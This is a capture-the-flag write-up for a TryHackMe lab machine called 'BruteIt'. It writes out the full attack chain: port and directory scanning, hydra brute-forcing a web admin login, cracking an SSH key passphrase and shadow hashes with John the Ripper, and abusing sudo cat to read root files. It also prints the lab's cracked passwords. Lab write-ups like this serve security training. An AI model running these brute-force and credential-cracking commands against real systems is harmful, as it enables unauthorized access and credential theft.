# Info

## IP = $IP

## Creds
- admin:xavier
- ssh: rockinroll

# Ports

## Port Scanning

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

## 22
```
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b0ebf14fa54b35c4415edb25da0ac8f (RSA)
|   256 d03a8155135e870ce8521ecf44e03a54 (ECDSA)
|_  256 dace79e045eb1725ef62ac98f0cfbb04 (ED25519)
```


## 80
```
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
```

### `gobuster`
```
/.hta                 (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/admin                (Status: 301) [Size: 314] [--> http://$IP/admin/]
```

### in _/admin_

- _<!-- Hey john, if you do not remember, the username is admin -->_

### hydra in _/admin_ with username _admin_
```
┌──(kali㉿kali)-[~/Desktop/CTFs/tryhackme/BruteIt]
└─$ hydra -l admin -P /usr/share/wordlists/rockyou.txt $IP -V http-form-post '/admin/:user=^USER^&pass=^PASS^:F=Username or password invalid' -I -V

(...)

[80][http-post-form] host: $IP   login: admin   password: xavier
```

### RSA private key decrypt
```
┌──(kali㉿kali)-[~/Desktop/CTFs/tryhackme/BruteIt]
└─$ /usr/share/john/ssh2john.py id_rsa >id_rsa.hashes
                                                                             
┌──(kali㉿kali)-[~/Desktop/CTFs/tryhackme/BruteIt]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt --format=SSH id_rsa.hashes 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
rockinroll       (id_rsa)     
1g 0:00:00:00 DONE (2024-02-05 13:47) 14.28g/s 1037Kp/s 1037Kc/s 1037KC/s saloni..rock14
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

### got an error while using id_rsa...
```
┌──(kali㉿kali)-[~/Desktop/CTFs/tryhackme/BruteIt]
└─$ chmod 400 id_rsa
```

### login in ssh with id_rsa
```
┌──(kali㉿kali)-[~/Desktop/CTFs/tryhackme/BruteIt]
└─$ ssh -i id_rsa john@$IP
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-118-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Feb  5 18:49:15 UTC 2024

  System load:  0.31               Processes:           104
  Usage of /:   25.7% of 19.56GB   Users logged in:     0
  Memory usage: 39%                IP address for eth0: $IP
  Swap usage:   0%


63 packages can be updated.
0 updates are security updates.


Last login: Wed Sep 30 14:06:18 2020 from 192.168.1.106
john@bruteit:~$
```

### user.txt
- flag{XXXX}

# PrivEsc

## `sudo -l`
```
john@bruteit:~$ sudo -l
Matching Defaults entries for john on bruteit:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User john may run the following commands on bruteit:
    (root) NOPASSWD: /bin/cat
john@bruteit:~$ sudo cat /root/root.txt
flag{XXXX}
```

## get root's password

- get the _shadow_ and _passwd_ files

```
┌──(kali㉿kali)-[~/Desktop/CTFs/tryhackme/BruteIt]
└─$ unshadow passwd.txt shadow.txt > passwords.txt
                                                                             
┌──(kali㉿kali)-[~/Desktop/CTFs/tryhackme/BruteIt]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt passwords.txt
Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (sha512crypt, crypt(3) $6$ [SHA512 128/128 SSE2 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
football         (root)
```